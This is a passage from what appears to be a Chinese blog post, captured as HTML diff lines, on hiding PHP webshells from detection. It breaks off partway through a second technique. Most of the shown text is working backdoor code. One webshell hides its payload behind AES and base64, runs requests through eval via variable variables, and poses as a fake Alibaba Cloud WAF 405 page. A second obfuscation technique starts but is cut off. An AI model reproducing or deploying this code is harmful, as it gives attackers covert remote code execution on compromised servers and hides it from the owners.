+<h3 id="1、aes-base64"><a href="#1、aes-base64" class="headerlink" title="1、aes+base64"></a>1、aes+base64</h3><p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/common/202410311620887.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/common/202410311620887.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cFile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">selectFile</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$sign</span> = <span class="string">&#x27;fff6cdb9613532a1&#x27;</span>;</span><br><span class="line">        <span class="variable">$fileurl</span> = <span class="string">&#x27;F4Ig+uOe6m94xRsp1jE3v3+NTr5ynQj/qVoBWQuKci0=&#x27;</span>;</span><br><span class="line">        <span class="variable">$file</span> = <span class="title function_ invoke__">openssl_decrypt</span>(c<span class="title class_">File</span>::<span class="title function_ invoke__">de</span>(<span class="variable">$fileurl</span>), <span class="string">&quot;AES-128-ECB&quot;</span>, <span class="variable">$sign</span>,OPENSSL_PKCS1_PADDING);</span><br><span class="line">        <span class="variable">$file_error</span> = <span class="variable">$$filename</span>;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$file_error</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;filename&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPriv</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">selectFile</span>(...);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">de</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cfile</span> = <span class="keyword">new</span> cFile;</span><br><span class="line"><span class="variable">$error</span> = <span class="variable">$cfile</span>-&gt;<span class="title function_ invoke__">getPriv</span>();</span><br><span class="line"><span class="variable">$error</span>(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$VMf0hX</span> = <span class="string">&quot;PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9InpoLWNuIj4KCjxoZWFkPgogICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPgogICAgPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJJRT1lZGdlLGNocm9tZT0xIj4KICAgIDxtZXRhIG5hbWU9ImRhdGEtc3BtIiBjb250ZW50PSJhM2MwZSIgLz4KICAgIDx0aXRsZT4KICAgICAgICA0MDUKICAgIDwvdGl0bGU+CiAgICA8c2NyaXB0IHNyYz0iLy9nLmFsaWNkbi5jb20vY29kZS9saWIvcXJjb2RlanMvMS4wLjAvcXJjb2RlLm1pbi5qcyI+PC9zY3JpcHQ+CiAgICA8c3R5bGU+CiAgICAgICAgaHRtbCwKICAgICAgICBib2R5LAogICAgICAgIGRpdiwKICAgICAgICBhLAogICAgICAgIGgyLAogICAgICAgIHAgewogICAgICAgICAgICBtYXJnaW46IDA7CiAgICAgICAgICAgIHBhZGRpbmc6IDA7CiAgICAgICAgICAgIGZvbnQtZmFtaWx5OiDlvq7ova/pm4Xpu5E7CiAgICAgICAgfQoKICAgICAgICBhIHsKICAgICAgICAgICAgdGV4dC1kZWNvcmF0aW9uOiBub25lOwogICAgICAgICAgICBjb2xvcjogIzNiNmVhMzsKICAgICAgICB9CgogICAgICAgIC5jb250YWluZXIgewogICAgICAgICAgICB3aWR0aDogMTAwMHB4OwogICAgICAgICAgICBtYXJnaW46IGF1dG87CiAgICAgICAgICAgIGNvbG9yOiAjNjk2OTY5OwogICAgICAgIH0KCiAgICAgICAgLmhlYWRlciB7CiAgICAgICAgICAgIHBhZGRpbmc6IDUwcHggMDsKICAgICAgICB9CgogICAgICAgIC5oZWFkZXIgLm1lc3NhZ2UgewogICAgICAgICAgICBoZWlnaHQ6IDM2cHg7CiAgICAgICAgICAgIHBhZGRpbmctbGVmdDogMTIwcHg7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IHVybChodHRwczovL2Vycm9ycy5hbGl5dW4uY29tL2ltYWdlcy9UQjFUcGFtSHBYWFhYYUpYWFhYZUI3bllWWFgtMTA0LTE2Mi5wbmcpIG5vLXJlcGVhdCAwIC0xMjhweDsKICAgICAgICAgICAgbGluZS1oZWlnaHQ6IDM2cHg7CiAgICAgICAgfQoKICAgICAgICAubWFpbiB7CiAgICAgICAgICAgIHBhZGRpbmc6IDUwcHggMDsKICAgICAgICAgICAgYmFja2dyb3VuZDoKICAgICAgICAgICAgICAgICNmNGY1Zjc7CiAgICAgICAgfQoKICAgICAgICAubWFpbiBpbWcgewogICAgICAgICAgICBwb3NpdGlvbjogcmVsYXRpdmU7CiAgICAgICAgICAgIGxlZnQ6IDEyMHB4OwogICAgICAgIH0KCiAgICAgICAgLmZvb3RlciB7CiAgICAgICAgICAgIG1hcmdpbi10b3A6CiAgICAgICAgICAgICAgICAzMHB4OwogICAgICAgICAgICB0ZXh0LWFsaWduOiByaWdodDsKICAgICAgICB9CgogICAgICAgIC5mb290ZXIgYSB7CiAgICAgICAgICAgIHBhZGRpbmc6IDhweCAzMHB4OwogICAgICAgICAgICBib3JkZXItcmFkaXVzOgogICAgICAgICAgICAgICAgMTBweDsKICAgICAgICAgICAgYm9yZGVyOiAxcHggc29saWQgIzRiYWJlYzsKICAgICAgICB9CgogICAgICAgIC5mb290ZXIgYTpob3ZlciB7CiAgICAgICAgICAgIG9wYWNpdHk6IC44OwogICAgICAgIH0KCiAgICAgICAgLmFsZXJ0LXNoYWRvdyB7CiAgICAgICAgICAgIGRpc3BsYXk6IG5vbmU7CiAgICAgICAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgICAgICAgICAgdG9wOiAwOwogICAgICAgICAgICBsZWZ0OiAwOwogICAgICAgICAgICB3aWR0aDogMTAwJTsKICAgICAgICAgICAgaGVpZ2h0OgogICAgICAgICAgICAgICAgMTAwJTsKICAgICAgICAgICAgYmFja2dyb3VuZDogIzk5OTsKICAgICAgICAgICAgb3BhY2l0eTogLjU7CiAgICAgICAgfQoKICAgICAgICAuYWxlcnQgewogICAgICAgICAgICBkaXNwbGF5OiBub25lOwogICAgICAgICAgICBwb3NpdGlvbjoKICAgICAgICAgICAgICAgIGFic29sdXRlOwogICAgICAgICAgICB0b3A6IDIwMHB4OwogICAgICAgICAgICBsZWZ0OiA1MCU7CiAgICAgICAgICAgIHdpZHRoOiA2MDBweDsKICAgICAgICAgICAgbWFyZ2luLWxlZnQ6IC0zMDBweDsKICAgICAgICAgICAgcGFkZGluZy1ib3R0b206CiAgICAgICAgICAgICAgICAyNXB4OwogICAgICAgICAgICBib3JkZXI6IDFweCBzb2xpZCAjZGRkOwogICAgICAgICAgICBib3gtc2hhZG93OiAwIDJweCAycHggMXB4IHJnYmEoMCwgMCwgMCwgLjEpOwogICAgICAgICAgICBiYWNrZ3JvdW5kOiAjZmZmOwogICAgICAgICAgICBmb250LXNpemU6IDE0cHg7CiAgICAgICAgICAgIGNvbG9yOiAjNjk2OTY5OwogICAgICAgIH0KCiAgICAgICAgLmFsZXJ0IGgyIHsKICAgICAgICAgICAgbWFyZ2luOgogICAgICAgICAgICAgICAgMCAycHg7CiAgICAgICAgICAgIHBhZGRpbmc6IDEwcHggMTVweCA1cHggMTVweDsKICAgICAgICAgICAgZm9udC1zaXplOiAxNHB4OwogICAgICAgICAgICBmb250LXdlaWdodDogbm9ybWFsOwogICAgICAgICAgICBib3JkZXItYm90dG9tOiAxcHggc29saWQgI2RkZDsKICAgICAgICB9CgogICAgICAgIC5hbGVydCBhIHsKICAgICAgICAgICAgZGlzcGxheTogYmxvY2s7CiAgICAgICAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgICAgICAgICAgcmlnaHQ6IDEwcHg7CiAgICAgICAgICAgIHRvcDogOHB4OwogICAgICAgICAgICB3aWR0aDogMzBweDsKICAgICAgICAgICAgaGVpZ2h0OiAyMHB4OwogICAgICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgICAgfQoKICAgICAgICAuYWxlcnQgcCB7CiAgICAgICAgICAgIHBhZGRpbmc6IDIwcHggMTVweDsKICAgICAgICB9CgogICAgICAgICNmZWVkYmFjay1jb250YWluZXIgewogICAgICAgICAgICB3aWR0aDogMTEwcHg7CiAgICAgICAgICAgIG1hcmdpbjogYXV0bzsKICAgICAgICAgICAgbWFyZ2luLXRvcDogMTIwcHg7CiAgICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgICB9CgogICAgICAgICNxcmNvZGUgewogICAgICAgICAgICBtYXJnaW46IDAgMTVweCA1cHggMTVweDsKICAgICAgICB9CgogICAgICAgICNmZWVkYmFjayBhIHsKICAgICAgICAgICAgY29sb3I6ICM5OTk7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMTJweDsKICAgICAgICAgICAgbWFyZ2luLXRvcDogNXB4OwogICAgICAgIH0KICAgIDwvc3R5bGU+CjwvaGVhZD4KCjxib2R5IGRhdGEtc3BtPSI3NjYzMzU0Ij4KICAgIDxzY3JpcHQ+CiAgICAgICAgd2l0aCAoZG9jdW1lbnQpIHdpdGggKGJvZHkpIHdpdGggKGluc2VydEJlZm9yZShjcmVhdGVFbGVtZW50KCJzY3JpcHQiKSwgZmlyc3RDaGlsZCkpIHNldEF0dHJpYnV0ZSgiZXhwYXJhbXMiLCAiY2F0ZWdvcnk9JnVzZXJpZD02ODUzMDgyOTUmYXBsdXMmdWRwaWQ9VldlVU9jZVFKZEtqJiZ5dW5pZD0mZTkzYjRlM2U3NWUwNSZ0cmlkPTY1MjViNzk2MTU4MzkyMDYwOTQwMDM5MzhlJmFzaWQ9QVlmNTJDamh0V2hlK2FmK0hRQUFBQUNXQS9TSW5PM1FMdz09IiwgaWQgPSAidGItYmVhY29uLWFwbHVzIiwgc3JjID0gKGxvY2F0aW9uID4gImh0dHBzIiA/ICIvL2ciIDogIi8vZyIpICsgIi5hbGljZG4uY29tL2FsaWxvZy9tbG9nL2FwbHVzX3YyLmpzIikKICAgIDwvc2NyaXB0PgogICAgPHNjcmlwdD4KICAgICAgICAvLwogICAgICAgIHZhciBpMThuT2JqZWN0ID0gewogICAgICAgICAgICAiemgtY24iOiB7CiAgICAgICAgICAgICAgICAibWVzc2FnZSI6ICLlvojmirHmrYnvvIznlLHkuo7mgqjorr/pl67nmoRVUkzmnInlj6/og73lr7nnvZHnq5npgKDmiJDlronlhajlqIHog4HvvIzmgqjnmoTorr/pl67ooqvpmLvmlq3jgIIiLAogICAgICAgICAgICAgICAgImJnSW1nIjogImh0dHBzOi8vZXJyb3JzLmFsaXl1bi5jb20vaW1hZ2VzL1RCMTVRR2FIcFhYWFhYT2FYWFhYaWEzOVhYWC02NjAtMTE3LnBuZyIsCiAgICAgICAgICAgICAgICAicmVwb3J0IjogIuivr+aKpeWPjemmiCIsCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgICJlbi11cyI6IHsKICAgICAgICAgICAgICAgICJtZXNzYWdlIjogIlNvcnJ5LCB3ZSBoYXZlIGRldGVjdGVkIG1hbGljaW91cyB0cmFmZmljIGZyb20geW91ciBuZXR3b3JrLCBwbGVhc2UgdHJ5IGFnYWluIGxhdGVyLiIsCiAgICAgICAgICAgICAgICAiYmdJbWciOiAiaHR0cHM6Ly9pbWcuYWxpY2RuLmNvbS90ZnMvVEIxQURBT0lGenFLMVJqU1pTZ1hYY3BBVlhhLTEzMjAtMjM0LmpwZyIsCiAgICAgICAgICAgICAgICAicmVwb3J0IjogIlJlcG9ydCIsCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgdmFyIGkxOG4gPSBpMThuT2JqZWN0WyJlbi11cyJdOwogICAgICAgIGlmIChuYXZpZ2F0b3IubGFuZ3VhZ2UuaW5kZXhPZigiemgiKSA+PSAwKSB7CiAgICAgICAgICAgIGkxOG4gPSBpMThuT2JqZWN0WyJ6aC1jbiJdOwogICAgICAgIH0KCiAgICA8L3NjcmlwdD4KCiAgICA8ZGl2IGRhdGEtc3BtPSIxOTk4NDEwNTM4Ij4KICAgICAgICA8ZGl2IGNsYXNzPSJoZWFkZXIiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibWVzc2FnZSI+CiAgICAgICAgICAgICAgICAgICAgPHNjcmlwdD5kb2N1bWVudC53cml0ZShpMThuLm1lc3NhZ2UpPC9zY3JpcHQ+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0ibWFpbiI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICA8c2NyaXB0PmRvY3VtZW50LndyaXRlKCc8aW1nIHdpZHRoPSI2NjAiIGhlaWdodD0iMTE3IiBzcmM9IicgKyBpMThuLmJnSW1nICsgJyIvPicpPC9zY3JpcHQ+CgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJmb290ZXIiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgICAgICAgICAgPHNwYW4gc3R5bGU9J2Rpc3BsYXk6bm9uZSc+CiAgICAgICAgICAgICAgICAgICAgPHNjcmlwdD4KICAgICAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24gZ2V0UXVlcnlTdHJpbmcodXJsLCBuYW1lKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgcmVnID0gbmV3IFJlZ0V4cCgnKF58JiknICsgbmFtZSArICc9KFteJl0qKSgmfCQpJyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgciA9IHVybC5zdWJzdHIoMSkubWF0Y2gocmVnKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChyICE9PSBudWxsKSByZXR1cm4gdW5lc2NhcGUoclsyXSk7IHJldHVybiBudWxsOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBfX3V1aWRfX18gPSBnZXRRdWVyeVN0cmluZyhsb2NhdGlvbi5ocmVmLCAidXVpZCIpCiAgICAgICAgICAgICAgICAgICAgPC9zY3JpcHQ+CiAgICAgICAgICAgICAgICA8L3NwYW4+CiAgICAgICAgICAgICAgICA8YSB0YXJnZXQ9Il9ibGFuayIgaWQ9InJlcG9ydCIgaHJlZj0iamF2YXNjcmlwdDo7IiBkYXRhLXNwbS1jbGljaz0iZ29zdHI9L3dhZi4xMjMuMTIzO2xvY2FpZD1kMDAxOyI+CiAgICAgICAgICAgICAgICAgICAgPHNjcmlwdD5kb2N1bWVudC53cml0ZShpMThuLnJlcG9ydCk8L3NjcmlwdD4KICAgICAgICAgICAgICAgIDwvYT4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KICAgIDxkaXYgaWQ9ImFsZXJ0U2hhZG93IiBjbGFzcz0iYWxlcnQtc2hhZG93Ij4KICAgIDwvZGl2PgogICAgPGRpdiBpZD0iYWxlcnRDb250YWluZXIiIGNsYXNzPSJhbGVydCI+CiAgICAgICAgPGgyPgogICAgICAgICAgICDmj5DnpLrvvJoKICAgICAgICAgICAgPGEgaHJlZj0iamF2YXNjcmlwdDo7IiB0aXRsZT0i5YWz6ZetIiBpZD0iY2xvc2VBbGVydCI+CiAgICAgICAgICAgICAgICBYCiAgICAgICAgICAgIDwvYT4KICAgICAgICA8L2gyPgogICAgICAgIDxwPgogICAgICAgICAgICDmhJ/osKLmgqjnmoTlj43ppojvvIzlupTnlKjpmLLngavlopnkvJrlsL3lv6vov5vooYzliIbmnpDlkoznoa7orqTjgIIKICAgICAgICA8L3A+CiAgICA8L2Rpdj4KICAgIDxkaXYgaWQ9ImZlZWRiYWNrLWNvbnRhaW5lciI+CiAgICAgICAgPGRpdiBpZD0icXJjb2RlIj48L2Rpdj4KICAgICAgICA8ZGl2IGlkPSJmZWVkYmFjayI+PC9kaXY+CiAgICA8L2Rpdj4KICAgIDxzY3JpcHQ+CiAgICAgICAgZnVuY3Rpb24gc2hvdygpIHsKICAgICAgICAgICAgdmFyIGcgPSBmdW5jdGlvbiAoZWxlKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoZWxlKTsKICAgICAgICAgICAgfTsKICAgICAgICAgICAgdmFyIHJlcG9ydEhhbmRsZSA9IGcoJ3JlcG9ydCcpOwogICAgICAgICAgICB2YXIgYWxlcnRTaGFkb3cgPSBnKCdhbGVydFNoYWRvdycpOwogICAgICAgICAgICB2YXIgYWxlcnRDb250YWluZXIgPSBnKCdhbGVydENvbnRhaW5lcicpOwogICAgICAgICAgICB2YXIgY2xvc2VBbGVydCA9IGcoJ2Nsb3NlQWxlcnQnKTsKICAgICAgICAgICAgdmFyIG93biA9IHt9OwogICAgICAgICAgICBvd24ucmVwb3J0ID0gZnVuY3Rpb24gKCkgeyAKICAgICAgICAgICAgICAgIG93bi5hbGVydCgpOwogICAgICAgICAgICB9OyBvd24uYWxlcnQgPSBmdW5jdGlvbiAoKSB7IGFsZXJ0U2hhZG93LnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOyBhbGVydENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsgfTsgb3duLmNsb3NlID0gZnVuY3Rpb24gKCkgeyBhbGVydFNoYWRvdy5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOyBhbGVydENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOyB9OwogICAgICAgIH07CgogICAgICAgIHZhciB1dWlkID0gbG9jYXRpb24uaHJlZi5tYXRjaCgvdXVpZD0oW14mXSspLyk7CiAgICAgICAgdXVpZCA9IHV1aWQgJiYgZW5jb2RlVVJJQ29tcG9uZW50KHV1aWRbMV0pOwogICAgICAgIHZhciB1cmxRckNvZGUgPSBsb2NhdGlvbi5ocmVmLm1hdGNoKC9xcmNvZGU9KFteJl0rKS8pOwogICAgICAgIHVybFFyQ29kZSA9IHVybFFyQ29kZSAmJiBkZWNvZGVVUklDb21wb25lbnQodXJsUXJDb2RlWzFdKTsKICAgICAgICBpZiAodXVpZCB8fCB1cmxRckNvZGUpIHsKICAgICAgICAgICAgdmFyIHFyY29kZSA9IG5ldyBRUkNvZGUoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInFyY29kZSIpLCB7CiAgICAgICAgICAgICAgICB0ZXh0OiB1cmxRckNvZGUgfHwgdXVpZCwKICAgICAgICAgICAgICAgIHdpZHRoOiA4MCwKICAgICAgICAgICAgICAgIGhlaWdodDogODAsCiAgICAgICAgICAgICAgICBjb2xvckRhcms6ICIjOTk5IiwKICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIHZhciBmZWVkYmFja0xpbmsgPSBnZXRGZWVkYmFja0xpbmsoKTsKICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImZlZWRiYWNrIikuaW5uZXJIVE1MID0gZmVlZGJhY2tMaW5rOwogICAgICAgIH0KICAgICAgICBmdW5jdGlvbiBnZXRGZWVkYmFja0xpbmsoKSB7CiAgICAgICAgICAgIHZhciB1cmxPcmlnaW47CiAgICAgICAgICAgIHVybE9yaWdpbiA9IGxvY2F0aW9uLmhyZWYubWF0Y2goL29yaWdpbj0oW14mXSspLyk7CiAgICAgICAgICAgIHVybE9yaWdpbiA9IHVybE9yaWdpbiAmJiBkZWNvZGVVUklDb21wb25lbnQodXJsT3JpZ2luWzFdKS5zcGxpdCgiPyIpWzBdOwogICAgICAgICAgICBpZiAodXJsT3JpZ2luKSB7CiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgIHVybE9yaWdpbiA9IG5ldyBVUkwodXJsT3JpZ2luKTsKICAgICAgICAgICAgICAgICAgICBpZiAodXJsT3JpZ2luLnByb3RvY29sICE9PSAiaHR0cHM6IiAmJiB1cmxPcmlnaW4ucHJvdG9jb2wgIT09ICJodHRwOiIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdXJsT3JpZ2luID0gbnVsbDsKICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICB1cmxPcmlnaW4gPSB1cmxPcmlnaW4uaHJlZjsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKHR5cGVvZiB1cmxPcmlnaW4gIT09ICJzdHJpbmciIHx8IHVybE9yaWdpbi5pbmRleE9mKCJodHRwIikgIT09IDApIHsKICAgICAgICAgICAgICAgICAgICAgICAgdXJsT3JpZ2luID0gbnVsbDsKICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICB1cmxPcmlnaW4gPSBmaWx0ZXJIdG1sKHVybE9yaWdpbik7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIHZhciBfbGFuZ3VhZ2UgPSBuYXZpZ2F0b3IuYnJvd3Nlckxhbmd1YWdlIHx8IG5hdmlnYXRvci5sYW5ndWFnZTsKICAgICAgICAgICAgdmFyIHRleHQgPSBbInpoLUNOIiwgInpoLWNuIl0uaW5jbHVkZXMoX2xhbmd1YWdlKSA/ICLngrnmiJHlj43ppoggPiIgOiAiQ2xpY2sgdG8gZmVlZGJhY2sgPiI7CiAgICAgICAgICAgIHJldHVybiAnPGEgaHJlZj0iJyArIHVybE9yaWdpbiArICcvX19fX190bWRfX19fXy9wYWdlL2ZlZWRiYWNrP3JhbmQ9UzNXeEdIQWdBdDc1NkVwem53Zk56SnEyQUZBMnFCTmxhM2o2RUlOVVM4V2U5ZGF6TV9pS0VscDhEd1ZTSFpVZXZwQzQxQng3UnppdlhJajlSblpnZGcmdXVpZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KHV1aWQpICsgJyZ0eXBlPTYiIHRhcmdldD0iX2JsYW5rIj4nICsgdGV4dCArICc8L2E+JzsKICAgICAgICB9OwogICAgICAgIGZ1bmN0aW9uIGZpbHRlckh0bWwoc3RyKSB7CiAgICAgICAgICAgIHN0ciA9IHN0ci5yZXBsYWNlKC8mL2csICIiKTsKICAgICAgICAgICAgc3RyID0gc3RyLnJlcGxhY2UoLz4vZywgIiIpOwogICAgICAgICAgICBzdHIgPSBzdHIucmVwbGFjZSgvPC9nLCAiIik7CiAgICAgICAgICAgIHN0ciA9IHN0ci5yZXBsYWNlKC8iL2csICIiKTsKICAgICAgICAgICAgc3RyID0gc3RyLnJlcGxhY2UoLycvZywgIiIpOwogICAgICAgICAgICBzdHIgPSBzdHIucmVwbGFjZSgvYC9nLCAiIik7CiAgICAgICAgICAgIHN0ciA9IHN0ci5yZXBsYWNlKC9qYXZhc2NyaXB0L2csICIiKTsKICAgICAgICAgICAgc3RyID0gc3RyLnJlcGxhY2UoL2lmcmFtZS9nLCAiIik7CiAgICAgICAgICAgIHJldHVybiBzdHI7CiAgICAgICAgfQoKICAgIDwvc2NyaXB0PgogICAgPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIGNoYXJzZXQ9InV0Zi04IiBzcmM9Imh0dHBzOi8vZXJyb3JzLmFsaXl1bi5jb20vZXJyb3IuanM/cz0xMCI+CiAgICA8L3NjcmlwdD4KPC9ib2R5PgoKPC9odG1sPg==&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">count</span>(<span class="variable">$_REQUEST</span>) || <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>) )&#123;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type:text/html;charset=utf-8&#x27;</span>);    <span class="title function_ invoke__">http_response_code</span>(<span class="number">405</span>);</span><br><span class="line">    <span class="keyword">echo</span> base64_decode<span class="comment">/**/</span>(<span class="variable">$VMf0hX</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里是对文件内容进行aes加密之后，用代码进行解密</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">selectFile</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$sign</span> = <span class="string">&#x27;fff6cdb9613532a1&#x27;</span>;</span><br><span class="line">        <span class="variable">$fileurl</span> = <span class="string">&#x27;F4Ig+uOe6m94xRsp1jE3v3+NTr5ynQj/qVoBWQuKci0=&#x27;</span>;</span><br><span class="line">        <span class="variable">$file</span> = <span class="title function_ invoke__">openssl_decrypt</span>(c<span class="title class_">File</span>::<span class="title function_ invoke__">de</span>(<span class="variable">$fileurl</span>), <span class="string">&quot;AES-128-ECB&quot;</span>, <span class="variable">$sign</span>,OPENSSL_PKCS1_PADDING);</span><br><span class="line">        <span class="variable">$file_error</span> = <span class="variable">$$filename</span>;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$file_error</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;filename&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPriv</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">selectFile</span>(...);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">de</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2、动态拼接-替换-base64"><a href="#2、动态拼接-替换-base64" class="headerlink" title="2、动态拼接+替换+base64"></a>2、动态拼接+替换+base64</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">/*&lt;meta name=&quot;29QlLQ&quot; content=&quot;ZYLWcbSb&quot;&gt;*/</span></span><br><span class="line"><span class="variable">$password</span>=<span class="string">&#x27;WlhaZYLWcbSbaGJDZ2ZYLWcbSbtYMUJQVTFSYkoyTnRaQ2RkS1RzPQ==&#x27;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">get_meta_tags</span>(<span class="keyword">__FILE__</span>)[<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]];</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;ddddddd:&quot;</span>.<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$arr</span> = <span class="title function_ invoke__">apache_response_headers</span>();</span><br><span class="line"><span class="variable">$template_source</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arr</span> <span 